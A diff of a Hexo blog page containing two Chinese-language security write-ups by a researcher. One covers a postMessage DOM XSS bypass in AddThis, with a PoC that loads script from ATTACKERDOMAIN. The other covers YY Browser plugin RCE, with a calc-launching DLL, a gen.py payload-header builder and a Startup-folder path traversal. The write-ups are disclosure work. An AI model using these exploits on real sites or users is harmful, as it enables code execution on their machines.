@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"zhchbin.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"zhchbin.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta property="og:type" content="website">
@@ -113,6 +113,16 @@
     <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
 
   </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
@@ -148,7 +158,7 @@
     <link itemprop="mainEntityOfPage" href="http://zhchbin.github.io/2016/12/25/DOM-XSS-Caused-by-AddThis/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.jpeg">
       <meta itemprop="name" content="Chaobin Zhang">
       <meta itemprop="description" content="">
     </span>
@@ -176,7 +186,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2017-08-30 23:14:42" itemprop="dateModified" datetime="2017-08-30T23:14:42+08:00">2017-08-30</time>
+                <time title="Modified: 2022-05-15 11:29:03" itemprop="dateModified" datetime="2022-05-15T11:29:03+08:00">2022-05-15</time>
               </span>
 
           
@@ -192,15 +202,16 @@
       
           <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>说明：这个漏洞是 <a href="https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/" target="_blank" rel="noopener">https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/</a> 修复的绕过，目前已经报告给AddThis并得到修复。</p>
 <blockquote>
-<p>AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容通过其他网络服务收藏或分享，诸如Facebook、MySpace、Google书签、Twitter等<br>From <a href="https://zh.wikipedia.org/wiki/AddThis" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/AddThis</a></p>
+<p>AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容通过其他网络服务收藏或分享，诸如Facebook、MySpace、Google书签、Twitter等
+From <a href="https://zh.wikipedia.org/wiki/AddThis" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/AddThis</a></p>
 </blockquote>
 <p>使用的例子有：</p>
-<p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1fb30n0dmyqj20nd08o0wd.jpg" alt=""></p>
-<p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1fb30nhwnasj20rq0bddho.jpg" alt=""></p>
+<p><img src="/images/7184df6bgw1fb30n0dmyqj20nd08o0wd.jpg" alt=""></p>
+<p><img src="/images/7184df6bgw1fb30nhwnasj20rq0bddho.jpg" alt=""></p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>使用这款插件，需要在网页上加入类似以下的代码</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Go to www.addthis.com/dashboard to customize your tools --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-538ceb912f1cca19"</span> <span class="attr">async</span>=<span class="string">"async"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>当插件加载完成后，就会监听<code>message</code>事件。</p>
-<p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1fb3110ele5j21340em79m.jpg" alt=""></p>
+<p><img src="/images/7184df6bgw1fb3110ele5j21340em79m.jpg" alt=""></p>
 <p>看完前面提到的那篇文章之后，我们可以知道在这个事件处理函数中，如果<code>message</code>事件处理函数接收到一个 <em>合法来源</em> 的消息，消息内容如下：<code>at-share-bookmarklet://example.com/xss.js</code>时，就会动态在页面中插入指定的JS脚本。之前的漏洞是在这里根本没有检查消息的来源就直接加载执行导致了DOM XSS，原先的PoC：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"frame"</span> <span class="attr">src</span>=<span class="string">"https://targetpage/using_addthis"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">'frame'</span>).contentWindow.postMessage(<span class="string">'at-share-bookmarklet://ATTACKERDOMAIN/xss.js'</span>, <span class="string">'*'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>AddThis对这个漏洞进行的修复如下：</p>
@@ -247,7 +258,7 @@
     <link itemprop="mainEntityOfPage" href="http://zhchbin.github.io/2016/10/15/YY-Browser-RCE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.jpeg">
       <meta itemprop="name" content="Chaobin Zhang">
       <meta itemprop="description" content="">
     </span>
@@ -267,10 +278,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2016-10-15 16:58:50 / Modified: 17:15:05" itemprop="dateCreated datePublished" datetime="2016-10-15T16:58:50+08:00">2016-10-15</time>
+              <time title="Created: 2016-10-15 16:58:50" itemprop="dateCreated datePublished" datetime="2016-10-15T16:58:50+08:00">2016-10-15</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-05-15 11:29:03" itemprop="dateModified" datetime="2022-05-15T11:29:03+08:00">2022-05-15</time>
+              </span>
 
           
 
@@ -288,14 +305,15 @@
 <h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!</p>
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在研究YY浏览器的默认游戏助手插件时，在代码里面找到一个游戏的名字：jzwl，于是在YY的游戏中心搜索了一下，找到了下面这个页面：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://udblogin.duowan.com/login.do?online&amp;report_ver=new&amp;showtools=0&amp;webyygame&amp;pro=webyygame&amp;rso=FROM_SCTG&amp;rso_desc=%E5%B8%82%E5%9C%BA%E6%8E%A8%E5%B9%BF&amp;ref=gw/entergame&amp;ref_desc=%E5%AE%98%E7%BD%91%2f%E8%BF%9B%E5%85%A5%E6%B8%B8%E6%88%8F&amp;game=JZWL&amp;server=s6</span><br></pre></td></tr></table></figure>
-<p>点开这个页面的时候，我电脑上的腾讯安全管家弹出了下载文件的提示，仔细一看，我擦，自动下载了这么多文件下来！于是我觉得可以研究研究这个东西。<br><img src="http://ww2.sinaimg.cn/large/7184df6bgw1f4xgo3kp46j20mb0htn3y.jpg" alt=""></p>
+<p>点开这个页面的时候，我电脑上的腾讯安全管家弹出了下载文件的提示，仔细一看，我擦，自动下载了这么多文件下来！于是我觉得可以研究研究这个东西。
+<img src="/images/7184df6bgw1f4xgo3kp46j20mb0htn3y.jpg" alt=""></p>
 <p>发现页面中有这样的一段代码：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"flash"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">object</span> <span class="attr">id</span>=<span class="string">"fancy3d"</span> <span class="attr">type</span>=<span class="string">"application/fancy-npruntime-fancy3d-plugin"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"198"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"game"</span> <span class="attr">value</span>=<span class="string">"jzwl"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"nprver"</span> <span class="attr">value</span>=<span class="string">"0.0.2.17"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"ocxver"</span> <span class="attr">value</span>=<span class="string">"0.0.2.17"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"liburl"</span> <span class="attr">value</span>=<span class="string">"http://loader.52xiyou.zsgl.ate.cn/jzwl/loader/loaderUpdater.71f24efc47252dee7ca07eb571bd6f50.dll"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"libmd5"</span> <span class="attr">value</span>=<span class="string">"71f24efc47252dee7ca07eb571bd6f50"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"unsafelib"</span> <span class="attr">value</span>=<span class="string">"allow"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param1"</span> <span class="attr">value</span>=<span class="string">"cmdline=uid:1576442523|skey:6|platform:duowan|sign:7115344fa13ccca8950cfea0484437ce|type:web"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param2"</span> <span class="attr">value</span>=<span class="string">"client_root_url=http://res.jzwl.52xiyou.com/client/"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param3"</span> <span class="attr">value</span>=<span class="string">"ip_port=[121.46.21.176,121.46.21.176,121.46.21.176,121.46.21.176]|[8092]"</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param5"</span> <span class="attr">value</span>=<span class="string">"loader_root_url=http://res.jzwl.52xiyou.com/loader/"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param6"</span> <span class="attr">value</span>=<span class="string">"loader_ver_name=loader.ver"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param7"</span> <span class="attr">value</span>=<span class="string">"loader_catalog_name=loader_catalog.txt"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param8"</span> <span class="attr">value</span>=<span class="string">"loader_name=loaderjz.dll"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>我擦！这个好像在哪里见过的：<a href="http://wooyun.org/bugs/wooyun-2016-0172781" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2016-0172781</a> 我们开始分析吧！</p>
 <h2 id="0x00-这个插件是哪里来的？"><a href="#0x00-这个插件是哪里来的？" class="headerlink" title="0x00 这个插件是哪里来的？"></a>0x00 这个插件是哪里来的？</h2><p>YY浏览器启动的时候会检查注册表中是否已经安装有Fancy3D游戏引擎这个NPAPI插件，具体路径如下。如果不存在，则会自动静悄悄地帮用户安装上。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\MozillaPlugins\@fancyguo.com/FancyGame,version=1.0.0.1</span><br></pre></td></tr></table></figure>
-<p><img src="http://ww2.sinaimg.cn/large/7184df6bgw1f4xg9lwxk8j20ru07cwi6.jpg" alt=""></p>
-<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f4xgbxgu0rj20qe04itaj.jpg" alt=""></p>
+<p><img src="/images/7184df6bgw1f4xg9lwxk8j20ru07cwi6.jpg" alt=""></p>
+<p><img src="/images/7184df6bgw1f4xgbxgu0rj20qe04itaj.jpg" alt=""></p>
 <h2 id="0x01-插件功能分析"><a href="#0x01-插件功能分析" class="headerlink" title="0x01 插件功能分析"></a>0x01 插件功能分析</h2><p><code>libcurl</code>和<code>libcmd5</code>这两个参数在 <a href="http://wooyun.org/bugs/wooyun-2016-0172781" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2016-0172781</a> 已经分析过，这里更简单，连域名白名单限制都没有做，直接修改成为自己的域名都会请求，一开始我以为是可以直接搞定的。但实验过后发现，自己写的dll按照规则放进去之后并没有加载到进程中。进一步查看信息，发现360浏览器那个洞里出现的游戏提供方好像是同一家公司，看样子是做了数字签名，没什么好方法，先放一边。</p>
 <p>里面还有几个参数，看上去也是会下载文件，把<code>&lt;param name=&quot;param5&quot; value=&quot;loader_root_url=http://a.com/loader/&quot;&gt;</code>改成自己本地的地址（注：我在Hosts文件里做了<code>127.0.0.1 a.com</code>映射）看看它都会请求下载哪些东西。测试过后，发现过程如下：</p>
 <ol>
@@ -310,7 +328,8 @@
 </ol>
 <h2 id="0x02-分析文件格式"><a href="#0x02-分析文件格式" class="headerlink" title="0x02 分析文件格式"></a>0x02 分析文件格式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk curl.exe.lzma</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">42            0x2A            LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, uncompressed size: 506048 bytes</span><br></pre></td></tr></table></figure>
 <p>观察每个文件，发现它们都有一个不定长的头部信息，然后是<code>LZMA:24</code>算法压缩的数据包，Google之后猜测是使用这里的工具开发的：<a href="http://www.7-zip.org/sdk.html" target="_blank" rel="noopener">http://www.7-zip.org/sdk.html</a></p>
-<p>接下来分析一下头部信息都是些什么东西。注：这里用的是小端规则。<br><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f4xie83ou5j20hp030jt7.jpg" alt=""></p>
+<p>接下来分析一下头部信息都是些什么东西。注：这里用的是小端规则。
+<img src="/images/7184df6bgw1f4xie83ou5j20hp030jt7.jpg" alt=""></p>
 <ul>
 <li>00 - 03 字节：29 00 00 00 = 0x29 = 41，正好是上面binwalk分析出来的头部长度。</li>
 <li>04 - 07 字节：B3 C7 03 00 = 0x03C7B3 = 247731，是loader_catalog.txt文件中 247772 - 41 得到的，而247772是curl.exe.lzma文件的大小。最终，通过<code>binwalk -e</code>解压开文件，发现就是加了头部信息之前的文件的大小 + 1</li>
@@ -322,12 +341,14 @@
 </ul>
 <h2 id="0x03-劫持loaderjz-dll-lzma这个文件实现远程命令执行"><a href="#0x03-劫持loaderjz-dll-lzma这个文件实现远程命令执行" class="headerlink" title="0x03 劫持loaderjz.dll.lzma这个文件实现远程命令执行"></a>0x03 劫持loaderjz.dll.lzma这个文件实现远程命令执行</h2><p>首先，自己实现一个dll文件，在其<code>DllMain</code>入口函数的时候中启动一下计算器就好，代码如下：</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		WinExec(<span class="string">"calc"</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译成Release版本，改名，使用 <a href="http://www.7-zip.org/sdk.html" target="_blank" rel="noopener">http://www.7-zip.org/sdk.html</a> 这里下载得到的lzma.exe压缩一下文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\lzma\bin&gt;lzma.exe e loaderjz.dll loaderjz.dll.lzma -d24</span><br><span class="line"></span><br><span class="line">LZMA 16.02 : Igor Pavlov : Public domain : 2016-05-21</span><br><span class="line"></span><br><span class="line">Input size:  12288 (0 MiB)</span><br><span class="line">Output size: 5748 (0 MiB)</span><br></pre></td></tr></table></figure></p>
-<p>接着使用脚本gen.py（见测试代码）生成带有头部信息的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python gen.py loaderjz.dll</span><br><span class="line">output.lzma||3a94912118bc172065d643e1aa847b0d||5794||9bc1ee40c622a0d7a1f96a6c9119bbe6||12288</span><br></pre></td></tr></table></figure></p>
+<p>编译成Release版本，改名，使用 <a href="http://www.7-zip.org/sdk.html" target="_blank" rel="noopener">http://www.7-zip.org/sdk.html</a> 这里下载得到的lzma.exe压缩一下文件
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\lzma\bin&gt;lzma.exe e loaderjz.dll loaderjz.dll.lzma -d24</span><br><span class="line"></span><br><span class="line">LZMA 16.02 : Igor Pavlov : Public domain : 2016-05-21</span><br><span class="line"></span><br><span class="line">Input size:  12288 (0 MiB)</span><br><span class="line">Output size: 5748 (0 MiB)</span><br></pre></td></tr></table></figure></p>
+<p>接着使用脚本gen.py（见测试代码）生成带有头部信息的文件：
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python gen.py loaderjz.dll</span><br><span class="line">output.lzma||3a94912118bc172065d643e1aa847b0d||5794||9bc1ee40c622a0d7a1f96a6c9119bbe6||12288</span><br></pre></td></tr></table></figure></p>
 <p>将生成的output.lzma覆盖<code>loaderjz.dll.lzma</code>，并将<code>loader_catalog.txt</code>中的值修改成上述命令的输出，使用YY浏览器访问测试页面。就可以执行任意程序了。</p>
-<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f4y97swvl3g20qu0h979t.gif" alt=""></p>
+<p><img src="/images/7184df6bgw1f4y97swvl3g20qu0h979t.gif" alt=""></p>
 <h2 id="0x04-任意路径写入漏洞导致RCE"><a href="#0x04-任意路径写入漏洞导致RCE" class="headerlink" title="0x04 任意路径写入漏洞导致RCE"></a>0x04 任意路径写入漏洞导致RCE</h2><p>在测试的过程中，我还发现头部信息中的文件名可以使用<code>..</code>跳转到上一级目录中，也就是说我们可以利用这个点来将一个可执行文件写入到用户的启动目录中。在生成头部信息时，只需要使用文件名：<code>..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe</code>，YY浏览器在下载这个生成的lzma文件之后就会自动将这个文件写入到启动目录中。</p>
-<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f4y9vhta2qj20lu06rabw.jpg" alt=""></p>
+<p><img src="/images/7184df6bgw1f4y9vhta2qj20lu06rabw.jpg" alt=""></p>
 <h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><p>gen.py</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">inputFileName = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#fileName = "..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe"</span></span><br><span class="line">fileName = <span class="string">"loaderjz.dll"</span></span><br><span class="line">fileNameLength = len(fileName) + <span class="number">1</span></span><br><span class="line">lzmaFile = inputFileName + <span class="string">".lzma"</span></span><br><span class="line">outputFile = <span class="string">"output.lzma"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(fname)</span>:</span></span><br><span class="line">    hash_md5 = hashlib.md5()</span><br><span class="line">    <span class="keyword">with</span> open(fname, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> iter(<span class="keyword">lambda</span>: f.read(<span class="number">4096</span>), <span class="string">b""</span>):</span><br><span class="line">            hash_md5.update(chunk)</span><br><span class="line">    <span class="keyword">return</span> hash_md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(outputFile, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(struct.pack(<span class="string">'I'</span>, <span class="number">32</span> + fileNameLength))</span><br><span class="line">    f.write(struct.pack(<span class="string">'I'</span>, os.path.getsize(lzmaFile) + <span class="number">1</span>))</span><br><span class="line">    f.write(struct.pack(<span class="string">'I'</span>, os.path.getsize(inputFileName)))</span><br><span class="line">    f.write(struct.pack(<span class="string">'H'</span>, fileNameLength))</span><br><span class="line">    f.write(struct.pack(<span class="string">'H'</span>, <span class="number">0x11</span>))</span><br><span class="line">    f.write(<span class="string">'\x00'</span> * <span class="number">16</span>)</span><br><span class="line">    f.write(fileName)</span><br><span class="line">    f.write(<span class="string">'\x00'</span> * <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">with</span> open(lzmaFile, <span class="string">"rb"</span>) <span class="keyword">as</span> lzmaF:</span><br><span class="line">        f.write(lzmaF.read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> outputFile + <span class="string">"||"</span> + md5(outputFile) + <span class="string">"||"</span> + str(os.path.getsize(outputFile)) +\</span><br><span class="line">        <span class="string">"||"</span> + md5(inputFileName) + <span class="string">"||"</span> + str(os.path.getsize(inputFileName))</span><br></pre></td></tr></table></figure>
       
@@ -405,6 +426,8 @@
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Chaobin Zhang"
+      src="/images/avatar.jpeg">
   <p class="site-author-name" itemprop="name">Chaobin Zhang</p>
   <div class="site-description" itemprop="description"></div>
 </div>
@@ -413,7 +436,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -423,11 +446,20 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
+          
         <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
 </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zhchbin" title="GitHub → https://github.com/zhchbin" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://hackerone.com/zhchbin" title="Hackerone → https://hackerone.com/zhchbin" rel="noopener" target="_blank"><i class="fa fa-fw"></i>Hackerone</a>
+      </span>
+  </div>
 
 
 
